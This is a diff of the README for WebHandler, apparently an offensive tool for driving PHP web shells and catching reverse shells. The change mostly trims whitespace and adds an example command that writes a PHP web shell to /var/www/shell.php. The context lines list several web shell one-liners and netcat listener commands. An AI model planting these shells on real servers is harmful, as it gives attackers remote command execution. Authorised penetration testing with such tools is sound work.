@@ -4,7 +4,7 @@ WebHandler - A hanlder for PHP system functions & alternative 'netcat listener'
 
 ### Info ###
 ---
-WebHandler tries to simulate a 'Linux bash prompt' to handle and  process: 
+WebHandler tries to simulate a 'Linux bash prompt' to handle and  process:
     - PHP _program execution functions_ (e.g. 'system', 'passthru', 'exec', etc)
     - Reserve shell connections (e.g. 'nc -lvvp 1234')
 
@@ -15,13 +15,16 @@ It also supports HTTP proxies (proxy http://<ip>:<port>
     - `<?php system($_GET['cmd']); ?>`
     - `<?php exec($_POST['cmd']); ?>`
     - `<?php passthru($_REQUEST['cmd']); ?>`
-    
+
 * WebHandler is a replacement for netcat with a reverse connection:
-    - netcat -l -p 1234   
-    - nc -lvvp 4321   
+    - netcat -l -p 1234
+    - nc -lvvp 4321
 
 ### Usage ###
 ---
+* --Example file
+    - echo '<?php system($_GET['cmd']); ?>' > /var/www/shell.php
+
 * --url is a required argument when sending either GET or POST requests (e.g. a bind 'web based PHP' connection):
     - python webhandler.py --url http://www.mywebsite.com/shell.php?cmd=
     - python webhandler.py --url http://www.mywebsite.com/shell.php --method POST --parameter cmd
@@ -44,7 +47,7 @@ This allows for the project to be kept up-to-date
 
 ### Links
 ---
-[Wiki][] 
+[Wiki][]
 
 [Known Bugs][]
 
